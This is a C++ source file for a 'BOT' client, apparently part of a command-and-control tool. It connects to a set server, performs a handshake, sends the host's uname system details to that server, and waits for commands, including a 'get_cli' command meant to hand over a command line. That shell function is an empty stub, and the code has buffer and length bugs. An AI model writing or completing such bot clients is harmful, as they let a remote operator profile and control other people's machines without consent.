#include <netinet/in.h>
#include <stdio.h>
#include <string.h>

#include <sys/utsname.h>

#include "commands.h"
#include "log.h"
#include "messages.h"
#include "tcp_client.hpp"
#include "sock.hpp"

#define BUF_SZ 1024

BOT::BOT()
{
	DEBUG(LOG_VERBOSE, "bot initialisation\n");

	this->socket = new Socket();
}

bool BOT::set_ip(char *serv_ip)
{
	DEBUG(LOG_VERBOSE, "bot set IP\n");

	return this->socket->set_ip(serv_ip);
}

bool BOT::set_port(char *serv_port)
{
	DEBUG(LOG_VERBOSE, "bot set port\n");
	
	return this->socket->set_port(serv_port);
}

bool BOT::init_connection()
{
	DEBUG(LOG_VERBOSE, "bot init connection\n");
	
	if (this->socket->create_socket() == false)
		return false;

	if (this->socket->connect_socket() == false) {
		this->socket->close_socket();
		return false;
	}

	return true;
}


bool BOT::main_loop()
{
	int cmd;
	struct command_ctx ctx;

	if (this->hand_shake() == false)
		return false;

	if (this->send_client_info() == false)
		return false;
	
	cmd = CMD_BYE;
	do {
		cmd = this->get_next_cmd(&ctx);
		switch (cmd) {
		case CMD_GET_CLI:
			this->get_cli_mode();
			break;
		default:
			break;
		}
	} while (cmd != CMD_BYE);


	return true;
}

int BOT::get_next_cmd(struct command_ctx *ctx)
{
	int len;
	char buff[BUF_SZ];

	if (this->socket->recv_msg(buff, &len, BUF_SZ) == false)
		return CMD_ERR;
	
	buff[len] = '\0';
	DEBUG(LOG_VERBOSE, "recived msg = %s\n", buff);

	if (strcmp(buff, "get_cli\n") == 0)
		return CMD_GET_CLI;
	
	return CMD_BYE;
}

bool BOT::get_cli_mode()
{
	DEBUG(LOG_DEFAULT, "try to get command line interface\n");

	
	return true;
}

bool BOT::send_client_info()
{
	struct utsname buf;
	bool ret;

	if (uname(&buf) != 0)
		return false;
	ret = this->socket->send_msg((char *)&buf, sizeof(buf));

	if (ret == false) {
		DEBUG(LOG_DEFAULT, "can't set client information\n");
		return false;
	}

	return true;
}

bool BOT::hand_shake()
{
	char buff[128];
	int len;
	bool ret;

	ret = this->socket->send_msg(HELLO_MSG, strlen(HELLO_MSG));
	if (ret == false) {
		DEBUG(LOG_DEFAULT, "send_msg handshake fail\n");
		return false;
	}

	ret = this->socket->recv_msg(buff, &len, sizeof(buff));
	
	if (ret == false) {
		DEBUG(LOG_DEFAULT, "send_msg handshake fail\n");
		return false;
	}
	
	if (this->validate_server(buff, ret) == false) {
		DEBUG(LOG_DEFAULT, "Host validation fail\n");
		return false;
	}

	DEBUG(LOG_DEFAULT, "hand shake success\n");

	return true;
}

bool BOT::validate_server(char *msg, int sz)
{
	if (strncmp(HELLO_ACK, msg, sz) != 0)
		return false;

	return true;
}

bool BOT::close_connection()
{
	DEBUG(LOG_VERBOSE, "bot close connection\n");

	return this->socket->close_socket();
}


